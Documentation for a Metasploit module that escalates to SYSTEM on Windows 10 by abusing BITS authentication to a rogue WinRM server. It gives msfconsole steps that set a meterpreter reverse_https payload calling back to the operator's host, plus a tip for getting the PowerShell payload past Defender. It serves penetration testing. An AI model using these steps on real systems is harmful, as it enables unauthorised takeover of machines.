# Description

This module exploits BITS behavior which tries to connect to the local Windows Remote Management server (WinRM) every times it starts. The exploit dll (loaded through a previous unprivilegied meterpreter session) launches a fake WinRM server which listens on port 5985 and triggers BITS. When BITS starts, it tries to authenticate to the Rogue WinRM server, which allows to steal a SYSTEM token. This token is then used to launch a new process as SYSTEM user. In the case of this exploit, powershell.exe is launched as SYSTEM and it downloads/executes an evil powershell script on a second local http server. Thus, this exploit doesn't write any file on the disk.

this exploit has been written from decoder's proof of concept:

This exploit has been successfully tested on :
- Windows 10 (10.0 Build 19041) 32 bits


# Verification Steps:

For exploiting, first get a meterpreter session which has either SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privilege. Then, in metasploit framework:

    use exploits/windows/local/bits_ntlm_token_impersonation
    set SESSION previous meterpreter session
    set PAYLOAD windows/meterpreter/reverse_https
    set LHOST your ip
    set LPORT your port
    exploit

A new meterpreter session belonging to SYSTEM should pop.


# Options:

Required:
- SESSION
- PAYLOAD
- LHOST
- LPORT

additional options in "show advanced" for powershell payload.


# WARNINGS:

- As this dll exploit runs 2 services on the target (Fake WinRM on port 5985 and HTTP on port 80), a firewall popup may appear on target screen. Thus, this exploit is not completely silent.
- A powershell windows flashes on target screen
- Windows servers are not vulnerable because a genuine WinRM service is already running.
- SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privs are required.
- BITS must not be already running.
- Powershell payload may be flagged by Windows defender. You can customize powershell payload with "show advanced"
